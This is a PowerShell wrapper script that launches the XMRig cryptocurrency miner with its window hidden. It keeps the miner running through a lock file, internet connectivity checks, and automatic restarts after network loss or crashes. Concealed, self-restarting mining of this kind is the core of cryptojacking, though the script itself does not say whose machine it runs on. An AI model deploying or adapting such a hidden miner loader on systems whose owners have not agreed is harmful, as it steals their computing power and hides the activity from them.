# XMRig Silent Wrapper v5
# Launched automatically by xmrig_setup_v5.bat
# Do not run this directly

$exePath    = "C:\Program Files\XMRig\xmrig.exe"
$configPath = "C:\Program Files\XMRig\config.json"
$lockDir    = "C:\ProgramData\XMRig"
$lockFile   = "C:\ProgramData\XMRig\miner.lock"

# ---- Duplicate instance prevention ----
# If lock file exists, check if xmrig is actually running
if (Test-Path $lockFile) {
    $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($running) {
        exit 0  # Already running legitimately
    } else {
        Remove-Item $lockFile -Force -ErrorAction SilentlyContinue  # Stale lock
    }
}

# Create lock dir and lock file
if (-not (Test-Path $lockDir)) {
    New-Item -Path $lockDir -ItemType Directory -Force | Out-Null
}
New-Item -Path $lockFile -ItemType File -Force | Out-Null

# Cleanup lock file on any exit
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    Remove-Item "C:\ProgramData\XMRig\miner.lock" -Force -ErrorAction SilentlyContinue
} | Out-Null

# ---- Self-healing: verify exe exists ----
if (-not (Test-Path $exePath)) {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    exit 0
}

# ---- Network check on start: wait up to 60 seconds ----
$online = $false
for ($i = 0; $i -lt 10; $i++) {
    try {
        Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
        $online = $true
        break
    } catch {
        Start-Sleep -Seconds 6
    }
}
if (-not $online) {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    exit 0
}

# ---- Launch xmrig completely hidden ----
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName               = $exePath
$pinfo.Arguments              = "--config=`"$configPath`" --no-color"
$pinfo.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
$pinfo.CreateNoWindow         = $true
$pinfo.UseShellExecute        = $false
[System.Diagnostics.Process]::Start($pinfo) | Out-Null

# ---- Main monitor loop ----
while ($true) {
    Start-Sleep -Seconds 30

    # Network check: kill if offline, restart when back online
    $online = $false
    try {
        Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
        $online = $true
    } catch {}

    if (-not $online) {
        Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
        while (-not $online) {
            Start-Sleep -Seconds 15
            try {
                Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
                $online = $true
            } catch {}
        }
        [System.Diagnostics.Process]::Start($pinfo) | Out-Null
    }

    # Crash recovery: restart if xmrig stopped unexpectedly
    $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if (-not $running) {
        Start-Sleep -Seconds 5
        [System.Diagnostics.Process]::Start($pinfo) | Out-Null
    }
}
